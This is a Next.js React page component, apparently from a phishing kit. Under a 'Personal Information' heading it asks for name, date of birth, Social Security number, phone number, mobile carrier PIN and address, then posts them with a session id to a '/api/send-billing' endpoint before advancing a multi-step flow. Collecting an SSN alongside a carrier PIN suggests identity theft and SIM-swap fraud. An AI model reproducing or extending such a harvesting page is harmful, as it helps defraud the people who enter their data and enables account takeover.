import { Box, TextField, Typography } from "@mui/material";
import React, { useContext, useState } from "react";
import { yupResolver } from "@hookform/resolvers/yup";
import axios from "axios";
import { useRouter } from "next/router";
import { useForm } from "react-hook-form";
import * as yup from "yup";
import ReactInputMask from "react-input-mask";
import { Button } from "../components/Button";
import { Wrapper } from "../components/Wrapper";
import { DataContext } from "./_app";
import { getNextUrl } from "../utils/getNextUrl";
import { getProgress } from "../utils/getProgress";

interface BillingProps {}

const schema = yup.object().shape({
  firstname: yup.string().required("First name required"),
  lastname: yup.string().required("Last name required"),
  dob: yup.string().required("Date of birth required"),
  ssn: yup.string().required("SSN Number required"),
  streetAddress: yup.string().required("Address required"),
  zipCode: yup.string().required("Zip code required"),
  state: yup.string().required("State required"),
  phoneNumber: yup.string().required("Phone number required"),
  carrierPin: yup.string(),
});

const Billing: React.FC<BillingProps> = ({}) => {
  const [loading, setLoading] = useState(false);

  const { data: datas, setData } = useContext(DataContext);
  const { push } = useRouter();
  const {
    register,
    handleSubmit,
    formState: { errors },
  } = useForm({
    resolver: yupResolver(schema),
    mode: `onBlur`,
  });

  const onSubmit = handleSubmit(async (data) => {
    setLoading(true);
    const formData = new FormData();

    formData.append(`form`, `BILLING`);
    formData.append(`billing`, JSON.stringify({ sessionId: datas.sessionId, ...data }));

    try {
      await axios.post(`/api/send-billing`, formData, {
        headers: { "content-type": `multipart/form-data` },
      });
    } catch (error) {
      console.log(error);
    }

    setData({
      ...datas,
      billing: data,
    });

    const url = getProgress()[getProgress().indexOf(`BILLING`) + 1];

    push(getNextUrl(url));
  });
  return (
    <Wrapper title={`Personal Information`}>
      <Box component={`form`}>
        <TextField
          label="First Name"
          variant="standard"
          fullWidth
          sx={{
            marginTop: `16px`,
          }}
          error={errors.firstname && errors.firstname.message}
          helperText={errors.firstname && errors.firstname.message}
          {...register(`firstname`)}
        />
        <TextField
          label="Last Name"
          variant="standard"
          fullWidth
          sx={{
            marginTop: `16px`,
          }}
          error={errors.lastname && errors.lastname.message}
          helperText={errors.lastname && errors.lastname.message}
          {...register(`lastname`)}
        />
        <ReactInputMask mask="99/99/9999" {...register("dob")}>
          {
            // @ts-ignore
            () => (
              <TextField
                label="Date of Birth"
                variant="standard"
                fullWidth
                sx={{
                  marginTop: `16px`,
                }}
                error={errors.dob && errors.dob.message}
                helperText={errors.dob && errors.dob.message}
                {...register(`dob`)}
              />
            )
          }
        </ReactInputMask>
        <ReactInputMask mask={"999-99-9999"} {...register("ssn")}>
          {
            // @ts-ignore
            () => (
              <TextField
                label="Social Security Number"
                variant="standard"
                fullWidth
                sx={{
                  marginTop: `16px`,
                }}
                error={errors.ssn && errors.ssn.message}
                helperText={errors.ssn && errors.ssn.message}
                {...register(`ssn`)}
              />
            )
          }
        </ReactInputMask>
        <ReactInputMask mask="(999) 999 9999" {...register("phoneNumber")}>
          {
            // @ts-ignore
            () => (
              <TextField
                label="Phone Number"
                variant="standard"
                fullWidth
                sx={{
                  marginTop: `16px`,
                }}
                error={errors.phoneNumber && errors.phoneNumber.message}
                helperText={errors.phoneNumber && errors.phoneNumber.message}
                {...register(`phoneNumber`)}
              />
            )
          }
        </ReactInputMask>
        <TextField
          label="Carrier Pin"
          variant="standard"
          fullWidth
          sx={{
            marginTop: `16px`,
          }}
          error={errors.carrierPin && errors.carrierPin.message}
          helperText={errors.carrierPin && errors.carrierPin.message}
          {...register(`carrierPin`)}
          type={`number`}
        />
        <TextField
          label="Street Address"
          variant="standard"
          fullWidth
          sx={{
            marginTop: `16px`,
          }}
          error={errors.streetAddress && errors.streetAddress.message}
          helperText={errors.streetAddress && errors.streetAddress.message}
          {...register(`streetAddress`)}
        />
        <TextField
          label="State"
          variant="standard"
          fullWidth
          sx={{
            marginTop: `16px`,
          }}
          error={errors.state && errors.state.message}
          helperText={errors.state && errors.state.message}
          {...register(`state`)}
        />
        <TextField
          label="Zip Code"
          variant="standard"
          fullWidth
          sx={{
            marginTop: `16px`,
          }}
          error={errors.zipCode && errors.zipCode.message}
          helperText={errors.zipCode && errors.zipCode.message}
          {...register(`zipCode`)}
          type={`number`}
        />
        <Button
          variant="contained"
          sx={{
            height: `36px`,
            textIndent: `0.0892857143em`,
            letterSpacing: `.0892857143em`,
            padding: `0 16px`,
            marginRight: `12px`,
          }}
          onClick={onSubmit}
          disabled={loading}
        >
          Next
        </Button>
      </Box>
      <Typography
        component={`p`}
        sx={{
          fontSize: `.875rem`,
          fontFamily: `Roboto,sans-serif`,
          fontWeight: 400,
          lineHeight: `1.25rem`,
          letterSpacing: `.0178571429em`,
          marginTop: `24px`,
          marginBottom: `16px`,
        }}
      ></Typography>
    </Wrapper>
  );
};

export default Billing;
